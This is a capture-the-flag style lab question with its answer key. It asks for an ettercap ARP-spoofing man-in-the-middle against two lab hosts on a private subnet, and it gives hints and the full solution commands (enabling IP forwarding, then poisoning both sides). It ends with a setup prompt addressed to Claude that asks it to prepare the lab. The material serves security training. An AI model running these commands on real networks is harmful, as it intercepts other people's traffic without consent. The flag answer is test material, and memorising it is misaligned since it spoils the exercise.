# Q128 — Ettercap ARP MITM

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` (Metasploitable 2); `192.168.52.130` (Windows 7) |
| **Domain** | 07 — Sniffing / 14 — Wireless |
| **Difficulty** | 🟡 Medium |
| **Tools** | `ettercap` |
| **Time budget** | 10–20 min |

---

## 📝 Question

Use ettercap to ARP-spoof between Parrot and Metasploitable+Win7. Provide command.

---

## 🎯 Flag Format

```
cmd=<short>
```

Example: `cmd=sudo ettercap -T -M arp:remote /192.168.52.129// /192.168.52.130//`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`-T` text mode; `-M arp:remote`.
</details>

<details>
<summary>Hint 2</summary>

Enable IP forwarding first.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo ettercap -T -M arp:remote /192.168.52.129// /192.168.52.130//
```

Poisons ARP tables both sides.

**Answer:** `cmd=sudo ettercap -T -M arp:remote /192.168.52.129// /192.168.52.130//`

📖 Ref: [tools/ettercap.md](../../tools/ettercap.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q128:
1. Verify both targets (192.168.52.129, 192.168.52.130) up on same L2.
2. On Parrot: which ettercap; sudo sysctl -w net.ipv4.ip_forward=1.
3. Interface eth0 verified: ip -br a.

Report back: "Lab ready for Q128 — ettercap installed, ip_forward=1, both targets reachable".
```
